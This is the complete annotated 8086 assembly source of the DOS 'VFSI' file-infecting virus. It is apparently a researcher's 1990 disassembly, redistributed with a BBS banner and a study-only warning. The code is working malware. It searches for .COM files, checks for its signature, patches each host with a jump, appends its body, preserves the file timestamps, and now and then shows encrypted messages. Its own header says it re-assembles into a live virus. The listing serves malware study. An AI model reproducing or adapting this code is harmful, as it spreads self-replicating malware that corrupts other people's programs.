;****************************************************************************;
;                                                                            ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]                            [=-                     ;
;                     -=] For All Your H/P/A/V Files [=-                     ;
;                     -=]    SysOp: Peter Venkman    [=-                     ;
;                     -=]                            [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                                                                            ;
;                    *** NOT FOR GENERAL DISTRIBUTION ***                    ;
;                                                                            ;
; This File is for the Purpose of Virus Study Only! It Should not be Passed  ;
; Around Among the General Public. It Will be Very Useful for Learning how   ;
; Viruses Work and Propagate. But Anybody With Access to an Assembler can    ;
; Turn it Into a Working Virus and Anybody With a bit of Assembly Coding     ;
; Experience can Turn it Into a far More Malevolent Program Than it Already  ;
; Is. Keep This Code in Responsible Hands!                                   ;
;                                                                            ;
;****************************************************************************;
	page	,132
	name	VFSI
	title	The 'VFSI' virus
	.radix	16

; ษออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
; บ  Bulgaria, 1404 Sofia, kv. "Emil Markov", bl. 26, vh. "W", et. 5, ap. 51 บ
; บ  Telephone: Private: +359-2-586261, Office: +359-2-71401 ext. 255	     บ
; บ									     บ
; บ				 The 'VFSI' Virus                            บ
; บ		 Disassembled by Vesselin Bontchev, September 1990	     บ
; บ									     บ
; บ		     Copyright (c) Vesselin Bontchev 1989, 1990 	     บ
; บ									     บ
; บ	 This listing is only to be made available to virus researchers      บ
; บ		   or software writers on a need-to-know basis. 	     บ
; ศออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ

; The disassembly has been tested by re-assembly using MASM 5.0.

code	segment
	assume	cs:code, ds:code

	org	100

msg_len equ	msg_2-msg_1	; Length of each of the two messages

start:
	jmp	v_entry 	; Jump to the virus body
	nop			; The rest of the infected program
	mov	ax,4C00 	; Just terminate
	int	21

; 1-15 bytes of garbage (in order to align
; the virus code to a paragraph boundary):

	db	7 dup (0)

v_entry:
	mov	ax,word ptr ds:[start+1]
	add	ax,offset start ; Compute the virus start address

	mov	cl,4		; Convert it to a segment address
	shr	ax,cl
	mov	cx,ds
	add	ax,cx
	inc	ax
	mov	ds,ax		; Put this segment address in DS

	jmp	v_start 	; Jump to the true virus code

first3	db	0EBh, 2, 90	; The original first 3 bytes
fmask	db	'*.COM', 0      ; Files to search for
jmp_op	db	0E9		; A JMP to the virus body is formed here
jmp_adr dw	0Dh

; First of the two encrypted messages. It says:
; 'HELLO!!! HAPPY DAY and SUCCESS'

msg_1	db	2Ah, 28h, 30h, 31h, 35h, 08h
	db	09h, 0Ah, 0Ah, 33h, 2Dh, 3Dh
	db	3Eh, 48h, 10h, 35h, 33h, 4Ch
	db	14h, 56h, 64h, 5Bh, 18h, 4Ch
	db	4Fh, 3Eh, 3Fh, 42h, 51h, 52h

; Second encrypted message. It says:
; '  from virus 1.1 VFSI-Svistov '

msg_2	db	02h, 03h, 4Ah, 57h, 55h, 54h
	db	08h, 5Fh, 53h, 5Dh, 61h, 60h
	db	0Eh, 20h, 1Eh, 22h, 12h, 49h
	db	3Ah, 48h, 3Fh, 24h, 4Bh, 6Fh
	db	63h, 6Eh, 70h, 6Ch, 74h, 1Fh

grb_len db	7		; Length of the garbage added to the file

v_start:
	push	ds		; Save DS

	mov	ax,ds:[first3-v_entry]		; Restore the original first 3
	mov	word ptr cs:[offset start],ax	;  bytes of the infected file
	mov	al,ds:[first3+2-v_entry]
	mov	byte ptr cs:[offset start+2],al

	mov	ax,1A00 	; Set new DTA
	lea	dx,cs:[dta-v_entry]
	int	21		; Do it

	mov	ax,4E00 	; Find first .COM file in the current directory
	lea	dx,cs:[fmask-v_entry]	; File mask to search for
	mov	cx,00100010b	; Archive, Hidden and Normal files
	int	21		; Do it

srch_lp:
	jnc	cont		; If found, continue
	jmp	close		; Otherwize exit

cont:
	mov	ax,3D02 	; Open the file for both reading and writing
	lea	dx,cs:[fname-v_entry]
	int	21		; Do it

	mov	bx,ax		; Save file handle in BX

	mov	ax,4202 	; Lseek to the end of file
	xor	cx,cx
	xor	dx,dx
	int	21		; Do it

	mov	word ptr ds:[fsize-v_entry],ax	; Save file size

	sub	ax,2		; Lseek two bytes before the file end
	mov	dx,ax
	mov	ax,4200
	int	21		; Do it

	mov	ax,3F00 	; Read the last two bytes of the file
	lea	dx,cs:[last2-v_entry]	; Put them there
	mov	cx,2		; (these bytes should contain
	int	21		;  the virus signature)

	mov	cx,ds:[last2-v_entry]	; Get these bytes
	cmp	cx,ds:[sign-v_entry]	; Compare them with the virus signature

; If they are not equal, then the file is still not infected. Go infect it:

	jne	infect

	mov	ax,3E00 	; If file infected, close it
	int	21		; Do close

	mov	ax,4F00 	; Find the next .COM file
	lea	dx,cs:[dta-v_entry]
	int	21		; Do it

	jmp	srch_lp 	; Loop until a non-infected file is found

; A non-infected file is found. Infect it:

infect:
	mov	ax,5700 	; Get file's date & time
	int	21		; Do it

	push	cx		; Save time & date on stack
	push	dx

	mov	ax,4200 	; Lseek to the file beginning
	xor	dx,dx
	xor	cx,cx
	int	21		; Do it

	mov	ax,3F00 	; Read the original first 3 bytes of the file
	mov	cx,3
	lea	dx,cs:[first3-v_entry]	; Save them in the virus body
	int	21		; Do it

	mov	ax,4200 	; Lseek to the beginning of the file again
	xor	dx,dx
	xor	cx,cx
	int	21		; Do it

; Align file size to the next multiple of 16:

	mov	ax,ds:[fsize-v_entry]
	and	ax,1111b
	push	ax		; Save AX
	xor	ax,1111b
	inc	ax

; Save the number of garbage bytes added in grb_len:

	mov	byte ptr ds:[grb_len-v_entry],al

	add	ax,ds:[fsize-v_entry]	; Form a Near JMP to the virus code
	sub	ax,3
	mov	word ptr ds:[jmp_adr-v_entry],ax	; Form the operand

	mov	ax,4000 	; Write this JMP in the first 3 bytes of file
	lea	dx,cs:[jmp_op-v_entry]
	mov	cx,3
	int	21		; Do it

	mov	ax,4202 	; Lseek to the end of file
	mov	dx,0
	xor	cx,cx
	int	21		; Do it

	lea	cx,cs:[v_end-v_entry-1] ; Virus size
	pop	ax		; Restore AX (new file size)
	mov	dx,ax
	xor	ax,1111b
	add	ax,2
	add	cx,ax		; Number of bytes to write

	mov	ax,ds		; DS := DS - 1
	dec	ax
	mov	ds,ax

	mov	ax,4000 	; Write the virus body after the end of file
	int	21		; Do it

	pop	dx		; Restore file's date & time
	pop	cx
	mov	ax,5701
	int	21		; Do it

close:
	mov	ax,3E00 	; Close the file
	int	21

	pop	ds		; Restore DS

	mov	ah,2C		; Get current time
	int	21

; If the hundreds of seconds are > 20, quit.
; This means that the messages are displayed
; with a probability of about 1/5:

	cmp	dl,20d		; Hundreds of seconds > 20?
	jg	quit		; Exit if so

; Print the messages:

	mov	ax,0E07 	; Beep (teletype write of ASCII 7)
	int	10		; Do it

	mov	ax,0F00 	; Get video mode
	int	10		; Do it

	push	ax		; Save mode on the stack

	xor	ax,ax		; Set video mode to 40x25 text
	int	10		; Do it

	mov	cx,msg_len	; Put message length in CX
	mov	dx,0A06 	; Goto row 10, column 6
	mov	bl,0E		; Screen attribute: dark yellow on black
	lea	bp,cs:[msg_1-v_entry]	; Point to the first message

prt_msg:
	mov	ah,2		; Go to the next display position
	int	10		; Do it

	mov	si,msg_len	; Get an ecrypted character from the message
	sub	si,cx
	mov	al,ds:[bp+si]

	add	al,msg_len	; These two instruction are needless
	sub	al,msg_len

	add	al,cl		; Decrypt the character

	mov	ah,9		; Write the character with the
	int	10		;  selected attribute

	inc	dl		; Go to the next screen position

	loop	prt_msg 	; Loop until done

	cmp	dh,10d		; Was this row 10?
	jne	msg_done	; If not, message printed; exit

	mov	cx,msg_len	; Otherwise get the length of the next message
	mov	bl,8C		; Screen attribute: blinking bright red on black
	mov	dx,0C06 	; Go to row 12, column 6
	lea	bp,cs:[msg_2-v_entry]	; Point to the second message
	jmp	prt_msg 	; And go print it

msg_done:
	xor	cx,cx		; CX := 0
delay:
	imul	cx		; Cause a delay
	imul	cx
	loop	delay		; Loop until done

	pop	ax		; Restore video mode from the stack
	xor	ah,ah
	int	10		; Set it as it was originally

quit:
	push	cs		; DS := CS
	pop	ds

	mov	ax,1A00 	; Restore old DTA
	mov	dx,81
	int	21		; Do it

	mov	si,offset start ; Jump to address CS:100h
	jmp	si		; Do it

sign	db	0F1, 0C8	; Virus signature

v_end	equ	$

fsize	equ	$		; Word. File size is saved here
last2	equ	$+2		; Word. Buffer for reading the virus signature
dta	equ	$+4		; Disk Transfer Area
fname	equ	dta+1E		; File name found

code	ends
	end	start
